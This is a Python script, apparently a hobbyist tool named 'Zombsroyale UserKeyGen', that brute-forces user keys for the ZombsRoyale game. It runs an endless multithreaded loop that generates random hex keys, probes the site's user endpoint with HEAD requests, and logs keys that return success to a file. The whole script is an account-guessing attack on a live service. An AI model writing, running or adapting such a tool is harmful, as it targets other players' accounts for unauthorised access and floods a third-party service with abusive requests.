import random
import requests
import sys
import threading

print("-" * 50)
print("Sonic's Zombsroyale UserKeyGen v.2.0")
print("Press Enter to start")
print("-" * 50)
input("")

def check_key(userKey):
    response = requests.head(f"https://zombsroyale.io/user/{userKey}")
    if response.status_code == 200:
        print(f"Success! Key found: {userKey}")
        with open("foundUserkeys.txt", "a") as o:
            o.write(userKey + "\n")
    elif response.status_code == 401:
        print(f"Key not found: {userKey}")

def gen():
    try:
        while True:
            threads = []
            for i in range(10):
                hash = random.getrandbits(192)
                userKey = "%048x" % hash
                thread = threading.Thread(target=check_key, args=(userKey,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()

    except KeyboardInterrupt:
        print("\nExiting program.")
        sys.exit()

gen()
